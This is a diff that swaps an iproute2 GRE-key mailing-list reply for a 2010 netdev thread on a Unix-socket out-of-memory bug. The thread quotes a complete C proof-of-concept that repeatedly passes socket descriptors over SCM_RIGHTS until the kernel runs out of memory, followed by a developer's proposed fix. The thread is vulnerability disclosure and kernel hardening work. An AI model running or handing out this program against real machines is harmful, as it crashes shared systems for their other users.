@@ -1,74 +1,150 @@
-From: Ben Hutchings <bhutchings@solarflare.com>
-Subject: Re: [PATCH] iproute2: support xfrm upper protocol gre key
-Date: Tue, 23 Nov 2010 22:26:47 +0000
-Message-ID: <1290551207.3013.9.camel@localhost>
-References: <1290524559-22086-1-git-send-email-timo.teras@iki.fi>
-	 <20101123082404.5b8ad019@nehalam> <4CEBEF7C.2060806@iki.fi>
-	 <20101123101302.54a9e4be@nehalam>
+From: Eric Dumazet <eric.dumazet@gmail.com>
+Subject: Re: Unix socket local DOS (OOM)
+Date: Wed, 24 Nov 2010 00:11:58 +0100
+Message-ID: <1290553918.2866.80.camel@edumazet-laptop>
+References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
 Mime-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: QUOTED-PRINTABLE
-Cc: Timo =?ISO-8859-1?Q?Ter=E4s?= <timo.teras@iki.fi>,
-	netdev@vger.kernel.org
-To: Stephen Hemminger <shemminger@linux-foundation.org>
+Cc: LKML <linux-kernel@vger.kernel.org>,
+	Andrew Morton <akpm@linux-foundation.org>,
+	Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>
+To: Vegard Nossum <vegard.nossum@gmail.com>,
+	David Miller <davem@davemloft.net>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from exchange.solarflare.com ([216.237.3.220]:5590 "EHLO
-	exchange.solarflare.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1752575Ab0KWW0x convert rfc822-to-8bit (ORCPT
-	<rfc822;netdev@vger.kernel.org>); Tue, 23 Nov 2010 17:26:53 -0500
-In-Reply-To: <20101123101302.54a9e4be@nehalam>
+Received: from mail-ww0-f47.google.com ([74.125.82.47]:40579 "EHLO
+	mail-ww0-f47.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1753777Ab0KWXMG (ORCPT
+	<rfc822;netdev@vger.kernel.org>); Tue, 23 Nov 2010 18:12:06 -0500
+In-Reply-To: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Tue, 2010-11-23 at 10:13 -0800, Stephen Hemminger wrote:
-> On Tue, 23 Nov 2010 18:44:44 +0200
-> Timo Ter=C3=A4s <timo.teras@iki.fi> wrote:
+Le mardi 23 novembre 2010 =C3=A0 23:21 +0100, Vegard Nossum a =C3=A9cri=
+t :
+> Hi,
 >=20
-> > On 11/23/2010 06:24 PM, Stephen Hemminger wrote:
-> > > On Tue, 23 Nov 2010 17:02:39 +0200
-> > > Timo Ter=C3=A4s <timo.teras@iki.fi> wrote:
-> > >=20
-> > >> +	case IPPROTO_GRE:
-> > >> +		if (sel->sport_mask || sel->dport_mask) {
-> > >> +			struct in_addr key;
-> > >> +			key.s_addr =3D htonl((ntohs(sel->sport) << 16) + ntohs(sel->=
-dport));
-> > >> +			inet_ntop(AF_INET, &key, abuf, sizeof(abuf));
-> > >> +			fprintf(fp, "key %s ", abuf);
-> > >> +		}
-> > >=20
-> > > The GRE key is not really an IPv4 address. Why should the utiliti=
-es
-> > > use IPv4 address manipulation to format/scan it.  It makes more s=
-ense
-> > > to me to just use u32 an do the necessary ntohl.
-> >=20
-> > This is pretty much how iptunnel.c does it, so I copied the code. W=
-ould
-> > you prefer to format it as single u32 number? Or use something else=
- for
-> > formatting it similar to IPv4?
-> >=20
-> > In either case, we should change iptunnel.c to match ipxfrm.c. It'l=
-l be
-> > easier if both parts handling the gre key treat it equivalently.
-> >=20
-> > I think Cisco does indeed treat it as u32 number in the configurati=
-ons.
-> > So I'm okay updating this patch, and fixing iptunnel.c side too. We
-> > might still want to keep the parsing of ipv4 format to keep backwar=
-ds
-> > compatibility.
+> I found this program lying around on my laptop. It kills my box
+> (2.6.35) instantly by consuming a lot of memory (allocated by the
+> kernel, so the process doesn't get killed by the OOM killer). As far
+> as I can tell, the memory isn't being freed when the program exits
+> either. Maybe it will eventually get cleaned up the UNIX socket
+> garbage collector thing, but in that case it doesn't get called
+> quickly enough to save my machine at least.
 >=20
-> My preference would be to take both dotted quad and a single
-> number.
+> #include <sys/mount.h>
+> #include <sys/socket.h>
+> #include <sys/un.h>
+> #include <sys/wait.h>
+>=20
+> #include <errno.h>
+> #include <fcntl.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <unistd.h>
+>=20
+> static int send_fd(int unix_fd, int fd)
+> {
+>         struct msghdr msgh;
+>         struct cmsghdr *cmsg;
+>         char buf[CMSG_SPACE(sizeof(fd))];
+>=20
+>         memset(&msgh, 0, sizeof(msgh));
+>=20
+>         memset(buf, 0, sizeof(buf));
+>         msgh.msg_control =3D buf;
+>         msgh.msg_controllen =3D sizeof(buf);
+>=20
+>         cmsg =3D CMSG_FIRSTHDR(&msgh);
+>         cmsg->cmsg_len =3D CMSG_LEN(sizeof(fd));
+>         cmsg->cmsg_level =3D SOL_SOCKET;
+>         cmsg->cmsg_type =3D SCM_RIGHTS;
+>=20
+>         msgh.msg_controllen =3D cmsg->cmsg_len;
+>=20
+>         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
+>         return sendmsg(unix_fd, &msgh, 0);
+> }
+>=20
+> int main(int argc, char *argv[])
+> {
+>         while (1) {
+>                 pid_t child;
+>=20
+>                 child =3D fork();
+>                 if (child =3D=3D -1)
+>                         exit(EXIT_FAILURE);
+>=20
+>                 if (child =3D=3D 0) {
+>                         int fd[2];
+>                         int i;
+>=20
+>                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd=
+) =3D=3D -1)
+>                                 goto out_error;
+>=20
+>                         for (i =3D 0; i < 100; ++i) {
+>                                 if (send_fd(fd[0], fd[0]) =3D=3D -1)
+>                                         goto out_error;
+>=20
+>                                 if (send_fd(fd[1], fd[1]) =3D=3D -1)
+>                                         goto out_error;
+>                         }
+>=20
+>                         close(fd[0]);
+>                         close(fd[1]);
+>                         goto out;
+>=20
+>                 out_error:
+>                         fprintf(stderr, "error: %s\n", strerror(errno=
+));
+>                 out:
+>                         exit(EXIT_SUCCESS);
+>                 }
+>=20
+>                 while (1) {
+>                         pid_t kid;
+>                         int status;
+>=20
+>                         kid =3D wait(&status);
+>                         if (kid =3D=3D -1) {
+>                                 if (errno =3D=3D ECHILD)
+>                                         break;
+>                                 if (errno =3D=3D EINTR)
+>                                         continue;
+>=20
+>                                 exit(EXIT_FAILURE);
+>                         }
+>=20
+>                         if (WIFEXITED(status)) {
+>                                 if (WEXITSTATUS(status))
+>                                         exit(WEXITSTATUS(status));
+>                                 break;
+>                         }
+>                 }
+>         }
+>=20
+>         return EXIT_SUCCESS;
+> }
+>=20
+>=20
+> Vegard
+> --
 
-inet_aton() covers that.
+Hi Vegard
 
-Ben.
+Do you have a patch to correct this problem ?
 
---=20
-Ben Hutchings, Senior Software Engineer, Solarflare Communications
-Not speaking for my employer; that's the marketing department's job.
-They asked us to note that Solarflare product names are trademarked.
+I suppose we should add a machine wide limit of pending struct
+scm_fp_list. (percpu_counter I guess)
+
+David, commit f8d570a4 added one "struct list_head list;" to struct
+scm_fp_list, enlarging it by a two factor because of power of two
+kmalloc() sizes.  (2048 bytes on 64bit arches instead of 1024
+previously)
+
+We might lower SCM_MAX_FD from 255 to 253 ?
+
+
 
